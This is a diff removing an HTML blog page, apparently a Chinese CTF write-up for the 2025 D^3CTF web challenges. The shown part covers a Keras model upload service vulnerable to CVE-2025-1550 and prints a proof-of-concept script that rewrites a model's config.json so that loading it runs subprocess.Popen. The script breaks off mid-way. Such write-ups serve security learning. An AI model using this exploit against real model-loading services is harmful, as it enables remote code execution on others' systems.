@@ -1,515 +1,62 @@
-
-<!DOCTYPE html><html lang="zh-CN">
-
-<head>
-  <meta charset="utf-8">
-  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8" theme-name="Stellar" theme-version="1.26.8">
-  
-  <meta name="generator" content="Hexo 7.1.0">
-  <meta http-equiv='x-dns-prefetch-control' content='on' />
-  <link rel="preconnect" href="https://gcore.jsdelivr.net" crossorigin><link rel="preconnect" href="https://unpkg.com" crossorigin><link rel="preconnect" href="https://cdn.bootcdn.net" crossorigin>
-  <meta name="renderer" content="webkit">
-  <meta name="force-rendering" content="webkit">
-  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
-  <meta name="HandheldFriendly" content="True" >
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="theme-color" content="#f8f8f8">
-  
-  <title>2025 D^3CTF Web WP - 妙尽璇机</title>
-
-  
-    <meta name="description" content="d3modelCVE-2025-1550考察 CVE-2025-1550 ，参考文章： https:&#x2F;&#x2F;blog.huntr.com&#x2F;inside-cve-2025-1550-remote-code-execution-via-keras-models https:&#x2F;&#x2F;jfrog.com&#x2F;blog&#x2F;keras-safe_mode-bypass-vulnerability&#x2F; CVE-2025-155">
-<meta property="og:type" content="article">
-<meta property="og:title" content="2025 D^3CTF Web WP">
-<meta property="og:url" content="https://changeyourway.github.io/2025/06/02/CTF/2025%20D^3CTF%20Web%20WP/index.html">
-<meta property="og:site_name" content="妙尽璇机">
-<meta property="og:description" content="d3modelCVE-2025-1550考察 CVE-2025-1550 ，参考文章： https:&#x2F;&#x2F;blog.huntr.com&#x2F;inside-cve-2025-1550-remote-code-execution-via-keras-models https:&#x2F;&#x2F;jfrog.com&#x2F;blog&#x2F;keras-safe_mode-bypass-vulnerability&#x2F; CVE-2025-155">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250531161022-6waen66.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250531165551-43kya6m.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250531165712-c16jz22.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250531162052-qi5ty3e.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250531164057-dpxsjty.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250531181122-1h4bb4o.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250531181209-unead7s.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250531181429-km5ikm9.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250531181608-gljcvfy.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250531202134-zqrs2e1.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250531202108-5qy6yxe.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250531184109-ymm6pyx.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250601120124-mkk76lf.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250601120248-52i88bg.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250601120616-aa4mkb3.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250601120808-s5c63c2.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250601122249-90alrko.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250601195629-5yv6st6.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250601202047-bk1evku.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250601204949-xk8c7mh.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250602003509-l8n9001.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250602003958-e61o42b.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250602004108-ga19z68.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250602004446-y5una90.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250602004544-agv9iwt.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250602004626-554081h.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250602004712-ksz2e12.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250602011409-mrruvec.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250602011346-za6en5n.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250602010218-tvnb2xz.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250602012559-ius1z3z.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250602012541-o3d0wd5.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250602012933-4b97hdy.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20250602014129-rl3fyui.png">
-<meta property="article:published_time" content="2025-06-02T13:02:53.619Z">
-<meta property="article:modified_time" content="2025-06-02T13:11:26.470Z">
-<meta property="article:author" content="妙尽璇机">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://changeyourway.github.io/images/image-20250531161022-6waen66.png">
-  
-  
-  
-  
-
-  <!-- feed -->
-  
-    <link rel="alternate" href="/atom.xml" title="妙尽璇机" type="application/atom+xml">
-  
-
-  <link rel="stylesheet" href="/css/main.css?v=1.26.8">
-
-  
-    <link rel="shortcut icon" href="/assets/favicon/favicon.ico">
-  
-
-  
-
-  
-  <link rel="apple-touch-icon" sizes="180x180" href="/assets/xaoxuu/favicon/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/xaoxuu/favicon/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/xaoxuu/favicon/favicon-16x16.png"><link rel="manifest" href="/assets/xaoxuu/favicon/site.webmanifest"><link rel="shortcut icon" href="/assets/xaoxuu/favicon/favicon.ico"><meta name="theme-color" content="#f8f8f8"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css" media="all" />
-</head>
-<body>
-
-<div class="l_body content tech" id="start" layout="post" ><aside class="l_left"><div class="sidebar-container">
-
-
-<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://raw.githubusercontent.com/ChangeYourWay/changeyourway.github.io/refs/heads/main/assets/20210722092640_f61bd.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">妙尽璇机</div><div class="sub cap">真理所致，吾心所向</div></a></div></header>
-
-<div class="nav-area">
-<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
-
-
-<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="专栏" href="/topic/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="探索" href="/explore/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
-</div>
-<div class="widgets">
-
-<widget class="widget-wrapper toc single" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#d3model"><span class="toc-text">d3model</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2025-1550"><span class="toc-text">CVE-2025-1550</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#d3invitation"><span class="toc-text">d3invitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81%E5%A4%84-json-%E6%B3%A8%E5%85%A5"><span class="toc-text">获取凭证处 json 注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tidy-quic"><span class="toc-text">tidy quic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E9%87%8D%E7%94%A8"><span class="toc-text">缓冲区重用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#d3jtar"><span class="toc-text">d3jtar</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JTar-%E4%B8%AD%E6%96%87%E8%A7%A3%E5%8E%8B%E4%B9%B1%E7%A0%81"><span class="toc-text">JTar 中文解压乱码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E5%88%AB%E9%B8%A3%E8%B0%A2"><span class="toc-text">特别鸣谢</span></a></li></ol></div></div></widget>
-
-
-
-
-
-
-
-<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title active" href="/2025/06/02/CTF/2025%20D%5E3CTF%20Web%20WP/"><span class="title">2025 D^3CTF Web WP</span><svg class="active-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M21 11.098v4.993c0 3.096 0 4.645-.734 5.321c-.35.323-.792.526-1.263.58c-.987.113-2.14-.907-4.445-2.946c-1.02-.901-1.529-1.352-2.118-1.47a2.225 2.225 0 0 0-.88 0c-.59.118-1.099.569-2.118 1.47c-2.305 2.039-3.458 3.059-4.445 2.945a2.238 2.238 0 0 1-1.263-.579C3 20.736 3 19.188 3 16.091v-4.994C3 6.81 3 4.666 4.318 3.333C5.636 2 7.758 2 12 2c4.243 0 6.364 0 7.682 1.332C21 4.665 21 6.81 21 11.098" opacity=".5"/><path fill="currentColor" d="M9 5.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5z"/></svg></a><a class="item title" href="/2024/09/06/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-JNDI%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/"><span class="title">漏洞篇 - JNDI 注入详解</span></a><a class="item title" href="/2025/02/20/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="title">漏洞篇 - Hessian 反序列化详解</span></a><a class="item title" href="/2025/05/17/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-SnakeYaml%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="title">漏洞篇 - SnakeYaml 反序列化</span></a><a class="item title" href="/2025/04/30/CTF/2025%20ACTF%20Web%20WP/"><span class="title">2025 ACTF Web 复现</span></a></div></widget>
-</div>
-
-</div></aside><div class="l_main" id="main">
-
-
-
-
-
-<div class="article banner top">
-  <div class="content">
-    
-<div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
-<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/CTF/">CTF</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-06-02T13:02:53.619Z">2025-06-02</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-06-02T13:11:26.470Z">2025-06-02</time></span></div></div>
-</div>
-
-    
-    <div class="bottom">
-      <div class="text-area">
-        <h1 class="text title"><span>2025 D^3CTF Web WP</span></h1>
-      </div>
-    </div>
-    
-  </div>
-  </div><article class="md-text content"><h2 id="d3model"><a href="#d3model" class="headerlink" title="d3model"></a>d3model</h2><h3 id="CVE-2025-1550"><a href="#CVE-2025-1550" class="headerlink" title="CVE-2025-1550"></a>CVE-2025-1550</h3><p>考察 CVE-2025-1550 ，参考文章：</p>
-<p><a target="_blank" rel="noopener" href="https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models">https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models</a></p>
-<p><a target="_blank" rel="noopener" href="https://jfrog.com/blog/keras-safe_mode-bypass-vulnerability/">https://jfrog.com/blog/keras-safe_mode-bypass-vulnerability/</a></p>
-<p>CVE-2025-1550 大致讲的是 Keras 模型的一个反序列化任意代码执行漏洞。Keras 的模型加载流程由 load_model 函数启动。该函数会根据模型类型和文件扩展名执行不同的加载路径。当调用 <code>_load_model_from_fileobj</code>​ 函数时，会提取 ZIP 文件的内容并开始重建模型。在此阶段，会检查 <code>config.json</code>​ 文件，并调用 <code>_model_from_config</code>​ 函数。将 JSON 对象加载到内存后，会调用 deserialize_keras_object 函数将序列化的结构转换回对象。</p>
-<p>打开题目，是一个文件上传界面：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250531161022-6waen66.png">
-
-<p>附件中包含了源代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import keras</span><br><span class="line">from flask import Flask, request, jsonify</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def is_valid_model(modelname):</span><br><span class="line">    try:</span><br><span class="line">        keras.models.load_model(modelname)</span><br><span class="line">    except:</span><br><span class="line">        return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    return open(&#x27;index.html&#x27;).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def upload_file():</span><br><span class="line">    if &#x27;file&#x27; not in request.files:</span><br><span class="line">        return jsonify(&#123;&#x27;error&#x27;: &#x27;No file part&#x27;&#125;), 400</span><br><span class="line">    </span><br><span class="line">    file = request.files[&#x27;file&#x27;]</span><br><span class="line">    </span><br><span class="line">    if file.filename == &#x27;&#x27;:</span><br><span class="line">        return jsonify(&#123;&#x27;error&#x27;: &#x27;No selected file&#x27;&#125;), 400</span><br><span class="line">    </span><br><span class="line">    MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB</span><br><span class="line">    file.seek(0, os.SEEK_END)</span><br><span class="line">    file_size = file.tell()</span><br><span class="line">    file.seek(0)</span><br><span class="line">    </span><br><span class="line">    if file_size &gt; MAX_FILE_SIZE:</span><br><span class="line">        return jsonify(&#123;&#x27;error&#x27;: &#x27;File size exceeds 50MB limit&#x27;&#125;), 400</span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(&#x27;./&#x27;, &#x27;test.keras&#x27;)</span><br><span class="line">    if os.path.exists(filepath):</span><br><span class="line">        os.remove(filepath)</span><br><span class="line">    file.save(filepath)</span><br><span class="line">    </span><br><span class="line">    if is_valid_model(filepath):</span><br><span class="line">        return jsonify(&#123;&#x27;message&#x27;: &#x27;Model is valid&#x27;&#125;), 200</span><br><span class="line">    else:</span><br><span class="line">        return jsonify(&#123;&#x27;error&#x27;: &#x27;Invalid model file&#x27;&#125;), 400</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=5000)</span><br></pre></td></tr></table></figure>
-
-<p>从源码中分析，可知其会把上传的文件保存成 .&#x2F;test.keras ，随后调用 is_valid_model 函数进行处理：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250531165551-43kya6m.png">
-
-<p>is_valid_model 中使用 load_model 来加载模型，而这正是漏洞的触发点：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250531165712-c16jz22.png">
-
-<p>此处并不需要过多地关心漏洞细节，在参考文章的最后给出了 exp ：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250531162052-qi5ty3e.png">
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import json</span><br><span class="line">from keras.models import Sequential</span><br><span class="line">from keras.layers import Dense</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">model_name=&quot;model.keras&quot;</span><br><span class="line"></span><br><span class="line">x_train = np.random.rand(100, 28*28)  </span><br><span class="line">y_train = np.random.rand(100) </span><br><span class="line"></span><br><span class="line">model = Sequential([Dense(1, activation=&#x27;linear&#x27;, input_dim=28*28)])</span><br><span class="line"></span><br><span class="line">model.compile(optimizer=&#x27;adam&#x27;, loss=&#x27;mse&#x27;)</span><br><span class="line">model.fit(x_train, y_train, epochs=5)</span><br><span class="line">model.save(model_name)</span><br><span class="line"></span><br><span class="line">with zipfile.ZipFile(model_name,&quot;r&quot;) as f:</span><br><span class="line">    config=json.loads(f.read(&quot;config.json&quot;).decode())</span><br><span class="line">    </span><br><span class="line">config[&quot;config&quot;][&quot;layers&quot;][0][&quot;module&quot;]=&quot;keras.models&quot;</span><br><span class="line">config[&quot;config&quot;][&quot;layers&quot;][0][&quot;class_name&quot;]=&quot;Model&quot;</span><br><span class="line">config[&quot;config&quot;][&quot;layers&quot;][0][&quot;config&quot;]=&#123;</span><br><span class="line">    &quot;name&quot;:&quot;mvlttt&quot;,</span><br><span class="line">    &quot;layers&quot;:[</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;:&quot;mvlttt&quot;,</span><br><span class="line">            &quot;class_name&quot;:&quot;function&quot;,</span><br><span class="line">            &quot;config&quot;:&quot;Popen&quot;,</span><br><span class="line">            &quot;module&quot;: &quot;subprocess&quot;,</span><br><span class="line">            &quot;inbound_nodes&quot;:[&#123;&quot;args&quot;:[[&quot;touch&quot;,&quot;/tmp/1337&quot;]],&quot;kwargs&quot;:&#123;&quot;bufsize&quot;:-1&#125;&#125;]</span><br><span class="line">        &#125;],</span><br><span class="line">            &quot;input_layers&quot;:[[&quot;mvlttt&quot;, 0, 0]],</span><br><span class="line">            &quot;output_layers&quot;:[[&quot;mvlttt&quot;, 0, 0]]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">with zipfile.ZipFile(model_name, &#x27;r&#x27;) as zip_read:</span><br><span class="line">    with zipfile.ZipFile(f&quot;tmp.&#123;model_name&#125;&quot;, &#x27;w&#x27;) as zip_write:</span><br><span class="line">        for item in 